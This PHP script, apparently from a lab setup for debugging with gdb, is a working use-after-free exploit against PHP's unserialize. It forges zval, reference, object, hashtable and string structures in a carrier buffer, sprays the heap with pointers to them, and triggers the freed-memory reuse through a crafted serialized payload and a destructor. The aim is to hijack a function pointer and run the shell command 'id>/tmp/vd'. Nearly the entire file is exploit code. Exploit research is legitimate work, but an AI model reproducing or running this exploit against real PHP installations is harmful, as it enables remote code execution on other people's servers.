<?php
/* LAB-ONLY CLI mirror of lab-pure-modphp/webroot/vd.php for gdb debugging.
 * Usage: php verify_vardestroy_cli.php <carrier_data_hex> <zif_hex> [magic]
 * With no address it prints a magic carrier and sleeps so /proc can measure.
 */

const CARRIER_LEN = 0x1000;
const OFF_ZVAL = 0x100;
const OFF_REF  = 0x200;
const OFF_OBJ  = 0x300;
const OFF_HT   = 0x400;
const OFF_STR  = 0x500;
const CMD      = "id>/tmp/vd 2>&1";
const IS_STRING = 6, IS_OBJECT = 8, IS_REFERENCE = 10, GC_REFERENCE = 26;

function p8(string &$s, int $off, int $val): void {
    $p = pack('P', $val);
    for ($i = 0; $i < 8; $i++) { $s[$off + $i] = $p[$i]; }
}
function p4(string &$s, int $off, int $val): void {
    $p = pack('V', $val & 0xFFFFFFFF);
    for ($i = 0; $i < 4; $i++) { $s[$off + $i] = $p[$i]; }
}
function pn(string &$s, int $off, string $b): void {
    for ($i = 0, $n = strlen($b); $i < $n; $i++) { $s[$off + $i] = $b[$i]; }
}

$argvAddr = $argv[1] ?? '0';
$argvZif  = $argv[2] ?? '0';
$magic    = hex2bin('56445541464d41474943307864656164'); // VDUAFMAGIC0xdead

$carrier = str_repeat("\x00", CARRIER_LEN);

if (hexdec($argvAddr) === 0) {
    for ($o = 0; $o < CARRIER_LEN; $o += 16) { pn($carrier, $o, $magic); }
    $GLOBALS['carrier'] = $carrier;
    fwrite(STDERR, "measure pid=" . getmypid() . "\n");
    sleep(20);
    exit(0);
}

$addr = hexdec($argvAddr);
$zif  = hexdec($argvZif);
$fake_zval = $addr + OFF_ZVAL;
$fake_ref  = $addr + OFF_REF;
$fake_obj  = $addr + OFF_OBJ;
$fake_ht   = $addr + OFF_HT;
$fake_str  = $addr + OFF_STR;

p8($carrier, OFF_ZVAL + 0, $fake_ref);
p4($carrier, OFF_ZVAL + 8, IS_REFERENCE | (1 << 8));
p4($carrier, OFF_ZVAL + 12, 0);
p4($carrier, OFF_REF + 0, 0);
p4($carrier, OFF_REF + 4, GC_REFERENCE);
p8($carrier, OFF_REF + 8, $fake_obj);
p4($carrier, OFF_REF + 16, IS_OBJECT | (1 << 8));
p4($carrier, OFF_REF + 20, 0);
p8($carrier, OFF_REF + 24, 0);
p4($carrier, OFF_OBJ + 0, 1);
p4($carrier, OFF_OBJ + 4, IS_OBJECT);
p4($carrier, OFF_OBJ + 8, 0);
p8($carrier, OFF_OBJ + 16, 0);
p8($carrier, OFF_OBJ + 24, $fake_ht);
p8($carrier, OFF_OBJ + 32, 0);
p4($carrier, OFF_OBJ + 40, 0);
p4($carrier, OFF_OBJ + 44, 1);
p8($carrier, OFF_OBJ + 48, 0);
p8($carrier, OFF_OBJ + 56, 0);
p8($carrier, OFF_OBJ + 64, 0);
p8($carrier, OFF_OBJ + 72, 0);
p8($carrier, OFF_OBJ + 80, $fake_str);
p4($carrier, OFF_OBJ + 88, IS_STRING);
p4($carrier, OFF_OBJ + 92, 0);
p4($carrier, OFF_HT + 0, 0);
p8($carrier, OFF_HT + 8, 0);
p8($carrier, OFF_HT + 16, $zif);
p4($carrier, OFF_STR + 0, 0xFFFFFFFF);
p4($carrier, OFF_STR + 4, IS_STRING);
p8($carrier, OFF_STR + 8, 0);
p8($carrier, OFF_STR + 16, strlen(CMD));
pn($carrier, OFF_STR + 24, CMD);
pn($carrier, 0x800, $magic . $magic);

$GLOBALS['carrier'] = $carrier;
$GLOBALS['FAKE_ZVAL'] = $fake_zval;
fwrite(STDERR, "addr=0x" . dechex($addr) . " fake_zval=0x" . dechex($fake_zval) . "\n");

class T {
    public function __destruct() {
        $zv = $GLOBALS['FAKE_ZVAL'];
        $spray = [];
        for ($i = 0; $i < 64; $i++) {
            /* one 8160 B allocation per string, pointer patched in place;
             * no intermediate same-size buffer may steal the freed chunk */
            $s = str_repeat("\x41", 8135);
            $q = pack('P', $zv);
            for ($j = 0; $j < 8; $j++) { $s[$j] = $q[$j]; }
            $spray[] = $s;
        }
        fwrite(STDERR, "spray done\n");
        $r = @unserialize('R:1020;');
        fwrite(STDERR, "after parse type=" . gettype($r) . "\n");
        unset($r);
        fwrite(STDERR, "after unset\n");
        unset($spray);
    }
}
$N = 1016;
$p = 'a:' . ($N + 2) . ':{';
for ($i = 0; $i < $N; $i++) { $p .= 'i:0;N;'; }
$p .= 'i:99999;O:1:"T":0:{}i:99999;i:42;}';
@unserialize($p);
fwrite(STDERR, "done\n");
